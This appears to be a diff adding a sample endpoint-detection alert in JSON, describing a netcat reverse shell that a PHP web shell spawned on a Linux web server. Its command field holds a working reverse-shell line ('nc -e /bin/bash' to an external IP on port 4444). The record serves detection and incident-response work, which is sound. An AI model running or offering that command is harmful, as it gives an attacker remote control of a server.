@@ -1,0 +1,61 @@
+{
+  "vendor": "Palo Alto Networks",
+  "product": "Cortex XDR Agent",
+  "severity": "High",
+  "category": "Command and Control",
+  "alert_name": "Netcat Established Suspicious Network Connection",
+  "description": "The netcat utility (nc.exe) established an outbound network connection from server LINUX-WEB-02 (172.16.80.55) to external IP address 198.51.100.88 on port 4444 at 2024-11-21 19:42:15 UTC. Netcat is a versatile networking tool commonly used by attackers for creating reverse shells, data exfiltration, and establishing command and control channels. The connection was initiated by user apache@linux-web-02 which is the web server service account with no legitimate need for netcat usage. The netcat process (PID 15847) maintained the connection for 47 minutes and transferred 2.3 MB of data to the remote server. The destination IP 198.51.100.88 is hosted in a bulletproof hosting provider in Russia and has been flagged in multiple threat intelligence feeds as associated with APT activity. Process analysis shows netcat was spawned from a PHP web shell (shell.php) indicating prior web server compromise. No legitimate business justification exists for netcat usage in the production environment.",
+  "host_name": "LINUX-WEB-02",
+  "host_ip": [
+    2886766647
+  ],
+  "host_os": "AGENT_OS_LINUX",
+  "user_name": [
+    "apache@linux-web-02"
+  ],
+  "cgo_name": [
+    "nc"
+  ],
+  "cgo_cmd": [
+    "nc -e /bin/bash 198.51.100.88 4444"
+  ],
+  "cgo_path": [
+    "/usr/bin/nc"
+  ],
+  "os_parent_name": [
+    "php"
+  ],
+  "os_parent_cmd": [
+    "php shell.php"
+  ],
+  "remote_ip": [
+    3325256792
+  ],
+  "remote_port": [
+    4444
+  ],
+  "local_ip": [
+    2886766647
+  ],
+  "local_port": [
+    58923
+  ],
+  "file_name": [
+    "shell.php"
+  ],
+  "file_path": [
+    "/var/www/html/uploads/shell.php"
+  ],
+  "threat_name": "Reverse Shell",
+  "attack_mode": "Command and Control",
+  "verdict": "Malicious",
+  "risk_score": "94",
+  "risk_rating": "Critical",
+  "policy_type": "Network Security",
+  "policy_description": "Netcat reverse shell to external C2 server",
+  "policy_severity": "Critical",
+  "policy_recommendation": "Isolate server immediately, terminate netcat process, investigate web shell, block C2 IP, review web server logs for initial compromise vector",
+  "log_source": "Cortex XDR Agent",
+  "mitre_att&ck_tactic": "TA0011 - Command and Control",
+  "mitre_att&ck_technique": "T1059.004 - Command and Scripting Interpreter: Bash"
+}
